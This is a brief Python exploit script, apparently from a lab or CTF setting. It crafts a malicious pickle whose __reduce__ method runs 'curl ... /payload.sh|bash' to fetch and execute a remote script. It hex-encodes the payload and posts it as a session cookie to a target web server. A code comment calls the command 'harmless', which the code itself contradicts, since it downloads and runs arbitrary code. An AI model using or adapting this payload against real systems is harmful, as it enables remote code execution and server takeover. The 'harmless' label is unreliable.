import pickle
import binascii
import requests

# -----------------------------
# Step 1: Create a controlled RCE payload
# -----------------------------
class Exploit:
    def __reduce__(self):
        import os
        # harmless command for testing
        return (os.system, ("curl 192.168.135.251:8000/payload.sh|bash",))
# Serialize and hex-encode
payload = binascii.hexlify(pickle.dumps(Exploit())).decode()
print(f"[+] Exploit payload (hex): {payload}")
# -----------------------------
# Step 2: Send it to the server
# -----------------------------
url = "http://127.0.0.1:5000/"  # Change to your target
cookies = {'session_data': payload}
r = requests.post(url, cookies=cookies)
print("[+] Response status code:", r.status_code)
print("[+] Response snippet:", r.text)
